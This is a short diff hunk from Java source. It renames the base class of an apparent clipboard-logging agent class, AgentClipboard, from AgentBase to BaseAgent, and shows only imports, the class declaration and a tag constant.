@@ -25,7 +25,7 @@ import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
-public class AgentClipboard extends AgentBase implements IncrementalLog {
+public class AgentClipboard extends BaseAgent implements IncrementalLog {
 
 	private static final String TAG = "AgentClipboard"; //$NON-NLS-1$
 
